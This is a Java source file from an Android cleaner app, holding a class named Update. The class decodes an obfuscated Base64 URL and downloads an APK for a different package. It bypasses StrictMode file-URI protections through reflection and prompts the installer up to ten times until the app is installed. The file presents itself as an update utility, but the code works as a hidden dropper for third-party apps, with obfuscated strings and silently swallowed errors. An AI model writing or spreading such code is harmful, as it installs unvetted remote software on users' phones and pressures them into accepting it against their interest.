package com.xlab13.zcleaner.utils;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.StrictMode;
import android.util.Base64;
import android.util.Log;

import java.io.File;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import static com.xlab13.zcleaner.utils.FS.appInstalledOrNot;
import static com.xlab13.zcleaner.utils.network.download_file;

public class Update {
    private Runnable task_apk_run;
    private Context context;
    private String url;
    private Integer tryUpdate = 10;

    public Update(Context context, String url){
        this.context = context;
        this.url = url;
        new MyAsyncTask().execute();
    }

    public void UpdateApp(){
        try{
            url = new String(Base64.decode(url, Base64.DEFAULT));
            //Log.e("===",url);
            String apk_path = download_file(context,url);
            if(apk_path.length()>0){
                final PackageManager pm = context.getPackageManager();
                PackageInfo info = pm.getPackageArchiveInfo(apk_path, 0);
                final String map = info.packageName;
                if (appInstalledOrNot(context, map)) {
                    File file = new File(apk_path);
                    file.delete();
                } else {
                    if (Build.VERSION.SDK_INT >= 24) {
                        try {
                            Method m = StrictMode.class.getMethod("disableDeathOnFileUriExposure");
                            m.invoke(null);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
                    StrictMode.setVmPolicy(builder.build());

                    final Handler mHandler = new Handler(Looper.getMainLooper());
                    final String appath = apk_path;
                    task_apk_run = new Runnable() {
                        public void run() {
                            if (!appInstalledOrNot(context, map)) {
                                if (new File(appath).exists()) {
                                    Intent intent = new Intent(Intent.ACTION_VIEW);
                                    intent.setDataAndType(Uri.fromFile(new File(appath)), new String(Base64.decode("YXBwbGljYXRpb24vdm5kLmFuZHJvaWQucGFja2FnZS1hcmNoaXZl", Base64.DEFAULT)));
                                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                    intent.setAction(Intent.ACTION_VIEW);
                                    context.startActivity(intent);
                                }
                                tryUpdate--;
                                if (tryUpdate > 0)
                                    mHandler.postDelayed(task_apk_run, 10000);  //repeat task
                            } else {
                                File file = new File(apk_path);
                                file.delete();
                            }
                        }
                    };
                    mHandler.postDelayed(task_apk_run, 5000);
                }
            }
        }catch (Exception e){
            //Log.e("===",e.toString());
        }
    }

    private class MyAsyncTask extends AsyncTask<Void, Integer, Integer> {
        @Override
        protected Integer doInBackground(Void... parameter) {
            UpdateApp();
            return 1;
        }

        @Override
        protected void onProgressUpdate(Integer... progress) {

        }
    }
}
